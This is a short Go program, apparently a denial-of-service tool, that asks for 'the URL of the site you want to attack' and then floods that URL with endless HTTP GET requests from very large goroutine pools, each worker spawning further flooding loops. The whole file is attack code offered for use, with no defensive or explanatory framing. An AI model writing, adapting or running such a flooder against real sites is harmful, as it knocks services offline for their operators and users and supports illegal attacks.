package ddosgo

import (
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/panjf2000/ants"
)

func main() {

	var url string
	fmt.Println("Please Enter the URL of the site you want to attack:")
	fmt.Scan(&url)

	p, err := ants.NewPool(100000000)

	if err != nil {
		panic(err)
	}

	defer p.Release()

	for {
		p.Submit(func() {
			go StartDDD(url)
			_, err := http.Get(url)

			if err != nil {
				panic(err)
			}
			log.Println("Sent request")
		})
		time.Sleep(time.Millisecond)

	}
}
func StartDDD(url string) {
	p, err := ants.NewPool(100000000)

	if err != nil {
		panic(err)
	}

	defer p.Release()

	for {
		go p.Submit(func() {
			_, err := http.Get(url)

			if err != nil {
				panic(err)
			}
			log.Println("Sent request")
		})
		time.Sleep(time.Millisecond)
	}

}
